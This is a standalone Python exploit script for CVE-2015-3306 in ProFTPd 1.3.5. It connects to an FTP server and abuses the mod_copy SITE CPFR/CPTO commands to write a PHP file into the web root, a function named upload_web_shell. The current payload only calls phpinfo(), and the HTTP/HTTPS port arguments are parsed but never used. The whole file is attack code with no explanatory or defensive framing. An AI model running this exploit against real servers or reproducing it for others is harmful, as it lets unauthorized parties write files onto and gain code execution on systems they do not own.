#!/usr/bin/python3
import sys
import socket
import argparse

EXIT_FAILURE: int = 1
EXIT_SUCCESS: int = 0


def upload_web_shell(target: str, ftp_port: int, web_path: str) -> bool:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        try:
            client_socket.connect((target, ftp_port))
        except TimeoutError:
            print(f"[!] Timed out while trying to connect to {target}:{ftp_port}")
            return False
        client_socket.send(b"site cpto <?php phpinfo(); ?>\r\n")
        client_socket.send(b"site cpfr /proc/self/fd/3\r\n")
        client_socket.send(f"site cpto {web_path}/info.php\r\n".encode("utf-8"))
    return True


def get_args() -> argparse.Namespace:
    parser: argparse.ArgumentParser = argparse.ArgumentParser(
        description="An exploit for CVE-2015-3306, a arbitrary file write vulnerability in ProFTPd 1.3.5"
    )
    parser.add_argument("--ip", type=str, help="The IP of the server to target")
    parser.add_argument("--ftp-port", type=int, help="The port of the server to target")
    parser.add_argument("--http-port", type=int, help="The HTTP web server port")
    parser.add_argument("--https-port", type=int, help="The HTTPS web server port")
    parser.add_argument(
        "--web-path",
        type=str,
        default="/var/www/html",
        help="Web path to attempt to upload web shell to",
    )
    return parser.parse_args()


def main() -> int:
    args: argparse.Namespace = get_args()

    if not (args.http_port or args.https_port) or (args.http_port and args.https_port):
        print("[!] Please supply a valid HTTPS xor a valid HTTP port")
        return EXIT_FAILURE

    if not upload_web_shell(args.ip, args.ftp_port, args.web_path):
        print("[!] Failed to upload web shell")
        return EXIT_FAILURE

    return EXIT_SUCCESS


if __name__ == "__main__":
    sys.exit(main())
